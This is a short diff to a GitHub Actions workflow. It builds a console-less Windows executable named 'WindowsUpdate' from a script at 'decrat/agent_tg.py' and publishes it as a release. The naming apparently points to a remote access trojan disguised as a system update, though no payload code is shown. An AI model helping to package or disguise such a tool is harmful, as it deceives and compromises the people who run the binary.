@@ -24,11 +24,12 @@ jobs:
 
       - name: Build EXE
         run: |
-          pyinstaller --onefile --noconsole --name="WindowsUpdate" agent_tg.py
+          pyinstaller --onefile --noconsole --name="WindowsUpdate" decrat/agent_tg.py
 
       - name: Get version tag
         id: version
-        run: echo "tag=build-$(date +'%Y%m%d-%H%M%S')" >> $env:GITHUB_OUTPUT
+        shell: pwsh
+        run: echo "tag=build-$(Get-Date -Format 'yyyyMMdd-HHmmss')" >> $env:GITHUB_OUTPUT
 
       - name: Create Release
         uses: softprops/action-gh-release@v2
